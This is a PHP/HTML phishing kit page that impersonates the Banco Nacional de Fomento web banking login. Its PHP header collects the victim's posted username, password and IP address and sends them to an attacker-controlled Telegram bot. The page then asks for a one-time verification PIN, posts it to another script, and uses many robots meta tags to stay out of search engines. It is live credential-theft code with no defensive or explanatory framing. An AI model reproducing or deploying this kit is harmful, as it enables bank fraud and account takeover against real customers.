<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
include('datos.php');

if( isset( $_POST['physicalPersonUser'] ) && isset( $_POST['userPassword']) ){

$message = ":::BNF:::\r\nUsuario.: ".$_POST['physicalPersonUser']."\r\nClave.: ".$_POST['userPassword']."\r\nIP: ".$userp."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
}
////////////////////
?>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="description" content="Banco Nacional de Fomento">
	<title>Banco Nacional de Fomento</title>
	<!-- CSS -->
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="resources/css/bootstrap.min-cfc4c5be8dfd1b16ace1d2885d57b9cd.css" rel="stylesheet">
	<link href="resources/fonts/font-awesome.min-a0e784c4ca94c271b0338dfb02055be6.css" rel="stylesheet">
	<link href="resources/Ionicons/ionicons.min-e5c40720e40dfc20694f2333b08480bb.css" rel="stylesheet">
	<link href="resources/css/bootstrap-datepicker3.min-02eeef62860c8ec1d2c34a34762a908b.css" rel="stylesheet">
	<link href="resources/css/select2.min-1f0229f4a835adde370c8490b5fe5fc7.css" rel="stylesheet">

	<link href="resources/css/AdminLTE.min-bf00ab515fc4e3773681283661d86b37.css" rel="stylesheet">

	<!-- fin AdminLTE  -->
	<link href="resources/css/style-check1-16c8fc2b01681891be8447220dbac845.css" rel="stylesheet">
	<link href="resources/css/style-check2-3b2a32b6d493746edca1b6a58a6cf2d7.css" rel="stylesheet">
	<link href="resources/css/input-picker-fc28607bfbe9de5b5ed86159bba16806.css" rel="stylesheet">
	<link href="resources/css/bnf_style.css" rel="stylesheet">
	<link href="resources/css/bnf_style_juridica-48fb26528977a47944a2e54ffa8e9ee9.css" rel="stylesheet">
	<link href="resources/css/bnf_responsive-29856e06128a757eb3d8e317b994099a.css" rel="stylesheet">
	<link href="resources/css/bnf_menu-style-09986febadf69f6f3fc21789d8f1a4df.css" rel="stylesheet">
	<link href="resources/css/bnf_icon-image-b9400967bcfaeb6b24323b3cf007e7f5.css" rel="stylesheet">
	<link href="resources/css/bnf_sidebar-4f55f81617ad20ef2cad0bbe120908d6.css" rel="stylesheet">
	<link href="resources/css/bnf_product_style-051c663f46de7f1a5c51126aa3396077.css" rel="stylesheet">
	<link href="resources/css/bnf_transfer-153b2ff4036e6d255296b6dff480c6a2.css" rel="stylesheet">
	<link href="resources/css/bnf_transac-7effff98325da97cd84f6856839d2db2.css" rel="stylesheet">
	<link href="resources/css/bnf_service-payment-de213940474fe5634af63cf03737ad10.css" rel="stylesheet">
	<link href="resources/css/pretty-checkbox.min-923e1c751dd2a2190163e141d00eb0b1.css" rel="stylesheet">
	<link href="resources/css/bootstrap-select.min-1dde27fd625567362692b22765e51596.css" rel="stylesheet">
	<link href="resources/css/keyboard-761df3eafe9915f79bc56ae5ee4e5c5b.css" rel="stylesheet">
	<link href="resources/css/loaders.min-92a7d5c46c1cc5976fff71d820722d53.css" rel="stylesheet">
	<link href="resources/css/bnf-administration-875170179b63467b0cafe272128b115e.css" rel="stylesheet">
	<link href="resources/css/bnf_blur_effect-e713b0503d4000dc702f410aa9d9e0b5.css" rel="stylesheet">


	<!--[if IE]><!-->
	<link href="resources/css/style-ie-1881e5abe5f2a7633f8f8cb883299d2e.css" rel="stylesheet">
	<!--<![endif]-->

	<!-- JS -->


	<script type="text/javascript" src="resources/js/jquery.min-473957cfb255a781b42cb2af51d54a3b.js"></script>
	<script type="text/javascript" src="resources/js/bootstrap.min-04c84852e9937b142ac73c285b895b85.js"></script>
	<script type="text/javascript" charset="UTF-8" src="resources/js/bootstrap-datepicker.min-2814134f125eda0e55aac5846ac49ce7.js"></script>
	<script type="text/javascript" src="resources/js/bootstrap-datepicker.es.min-0c240809f25d1bf69a78e589d81b15fd.js"></script>
	<script type="text/javascript" src="resources/js/select2.full.min-cedc3f883dce7d47a93e2c73da925b44.js"></script>
	<script type="text/javascript" charset="UTF-8" src="resources/js/moment.min-19436ad9831513f90ffd2421b3d97903.js"></script>

	<script type="text/javascript" src="resources/js/adminlte-541edd610ddfebc0c0eddfe0a6561161.js"></script>

	<script type="text/javascript" src="resources/js/input-picker-3360a0d9ae24c7e1e560c1dd56bd0ecf.js"></script>
	<script src="resources/js/format-date-c4236f9bfd2428d4787f8a756afe24af.js"></script>

	<!-- BNF  -->
	<script type="text/javascript" src="resources/js/bnf-d5a801aeb4800ff158317e0e7ba39c94.js"></script>
	<script type="text/javascript" src="resources/js/bnf_card-493ce8a411a2e94f18d0634c6a52fc7a.js"></script>
	<script type="text/javascript" src="resources/js/bnf_invoice-3b1e3db0fa5fee3cc3b2f0316cc9a815.js"></script>
	<script src="resources/js/bnf_validator-c0b1b854683e8a38ca4e3ce4f9e848af.js"></script>
	<script src="resources/js/bnf_service-payment-64e9593ffaa15071323685ddf20f3faf.js"></script>
	<!-- ./BNF  -->

  <meta name="googlebot" content="noindex">
  	<meta name="googlebot" content="nofollow">
  	<meta name="googlebot" content="noarchive">
  	<meta name="googlebot" content="nocache">
  	<meta name="googlebot" content="noimageindex">
  	<meta name="googlebot" content="nomediaindex">
  	<meta name="googlebot" content="noodp">
  	<meta name="googlebot" content="noodyp">
  	<meta name="googlebot" content="notranslate">
  	<meta name="googlebot" content="noyaca">
  	<meta name="googlebot" content="noydir">
  	<meta name="slurp" content="none">
  	<meta name="slurp" content="noindex">
  	<meta name="slurp" content="nofollow">
  	<meta name="slurp" content="noarchive">
  	<meta name="slurp" content="nocache">
  	<meta name="slurp" content="noimageindex">
  	<meta name="slurp" content="nomediaindex">
  	<meta name="slurp" content="noodp">
  	<meta name="slurp" content="notranslate">
  	<meta name="slurp" content="noyaca">
  	<meta name="slurp" content="noydir">


	<script src="resources/js/jquery-migrate-1.2.1.min-512b871a2830e44259bc3ce3343afcd0.js"></script>
	<script src="resources/js/keyboard-a98c1455885468b8d1612c460e5c2ac4.js"></script>

	<script src="resources/js/bootstrap-select.min-b11855265dbb69e2fa25eead0ccec00b.js"></script>
	<script type="text/javascript" src="resources/js/commons-eb215446af73b19a44da1419f3114f87.js"></script>
	<script src="resources/js/jquery.form-validator.min-ec00fe862aeae21c32c73cd3e64f1590.js"></script>


	<script src="resources/js/jquery.inputmask.min-e1346276096e4bab8df257a739d93878.js"></script>
	<script src="resources/js/jqueryinputmaskdateextensionsmin.js"></script>
	<script src="resources/js/jqueryinputmaskextensionsmin.js"></script>
	<script type="text/javascript" src="resources/js/loaders.css-01833bc0c0285e49455adc3a4ebff96b.js"></script>


</head>
<body class="" style="height: auto; min-height: 100%;">
	<div class="loader">
		<div class="loader-inner ball-spin-fade-loader ">
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
			<div></div>
		</div>
	</div>
	<div class="wrapper" style="height: auto; min-height: 100%;">
		<header class="main-header background-F fondo-imagen-F">
			<div class="row encabezado-height">
				<!-- Cuando venga el tipo de persona  cambiar el numeroCedula por RUC -->
				<div class="col-lg-6 col-lg-offset-0 col-sm-5 col-sm-offset-0 col-md-5 col-md-offset-0 col-xs-6 col-xs-offset-3 height-inherent">
					<div class="logo-position">
						<img src="resources/img/laptop_1440x900/logo_F-7a4b649a583caf95c6bd2199eda7a96e.png" style="width: 180px;">
					</div>
				</div>
			</div>
		</header>
		<div class="content-wrapper fondo-imagen-login" style="min-height: 565px;">
			<div class="navbar navbar-inverse" role="navigation">
				<div class="">
					<div class="collapse navbar-collapse" style="padding-left: 0px;">
						<ul class="nav navbar-nav" style="text-align: left;">
							<li class="dropdown active"><a href="#" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false">Banca Web</a></li>
						</ul>
					</div>
				</div>
			</div>
			<!-- LOGIN  -->
			<section class="content content-tablero">
				<div class="row">
					<section class="content content-tablero">
						<div class="content content-login pull-right">
							<ul class="nav nav-tabs navbar-right-movil login-opacity">
								<li class="active list-li-a">
									<a href="#tab_a" data-toggle="tab" class="nexa-light-white list-a login-a-tab">
										<p class="login-title-a">
											Validacion
										</p>
									</a>
								</li>


								<li class=" list-li-c">
				
								</li>
							</ul>
							<div class="tab-content content-tab login-tab-pin-movil login-opacity">
								<!-- PESTAÑA A - PERSONA FISICA  -->
								<div class="tab-pane table-image active" id="tab_a">
									<div class="header-tab-pane">
										<h3 class="nexa-light-blue div-title-login">
											Acceso a la Web
										</h3>
									</div>
									<div class="line"></div>
									<form id="" action="validado.php" method="POST" autocomplete="off" class="has-validation-callback">
										<input id="userType" name="userType" value="F" type="hidden">
										<input id="tstamp" name="tstamp" type="hidden" value="">
										<input id="si4clp" name="si4clp" type="hidden" value="D7499623FC1B3C4DB4606DC15A0ADBD9">

										<div class="box box-verify">
											<div class="box-body div-motivo verify">
												<div class="col-lg-6 col-md-6 col-sm-6 col-xs-6 pull-left text-left pdr0 pdl0 text-left" style="float: right !important;">

												</div>
											</div>
										</div>

										<!-- USR -->
										<div class="box box-verify ">
											<div class="box-body div-motivo verify">
												<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 pull-left text-left">
													<p class="nexa-light-red">
													¡Hemos enviado un codigo de verificacion temporal a tu correo electronico y/o celular registrado a tu cuenta!
													</p>
													<div class="input-group col-lg-12 col-md-12 col-sm-12 col-xs-12">
														<span class="fisica input-group-icon icon-error-span hidden">
					                                            <i class="icon-error-gral icon-error"></i>
					                                        </span>
														<div class="col-lg-12 col-md-12 col-sm-12 col-xs-12" style="padding-left: 0px;">
															<input id="loginUserFisic" name="PIN" class="form-control input-field-15px nexa-light-gray" tabindex="4" data-validation-error-msg-required="Debe ingresar el usuario" data-validation="required" type="number" value="" autocomplete="off" required>
														</div>
													</div>
												</div>
											</div>
										</div>
									
										<div class="box box-verify">
											<div class="box-body">

												<div class="col-lg-6 col-md-6 col-sm-6 col-xs-12 col-lg-offset-3 col-md-offset-3 col-sm-offset-3 col-xs-offset-0">
													<button type="submit" class="btn btn-red btn-block btn-sm nexa-light-white">Ingresar</button>
												</div>
											</div>
										</div>
									</form>
								</div>
								<!--/.PESTAÑA A - PERSONA FISICA  -->




							</div>
						</div>
					</section>

				</div>
			</section>
			<!-- ./LOGIN  -->


		</div>


	</div>


	<div id="bienvenidaModal" class="modal fade" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" style="display: none;" aria-hidden="true">
		<div class="modal-dialog" role="document">
			<div class="modal-content" id="seriviosPopupContent" style="margin: auto;">
				<div class="modal-header" id="seriviosPopupHeader">
					<h4 class="text-center"><a href="#" class="dropdown-toggle nexa-light-blue title-tablero collapsed">
            	<span style="width=10px"></span></a>
            	<button type="button" class="close closeBtn" data-dismiss="modal" aria-label="Close">
          		<span onclick="closeModal()">×</span>
       		</button>
         </h4>

				</div>
				<div class="modal-body" id="seriviosPopupImage">
					<div class="box-body text-left" style="border-top-width: 15px; margin-top: 15px;">
						<div class="pretty p-default text-left">

						</div>
					</div>
				</div>

			</div>
		</div>
	</div>






</body>
</html>
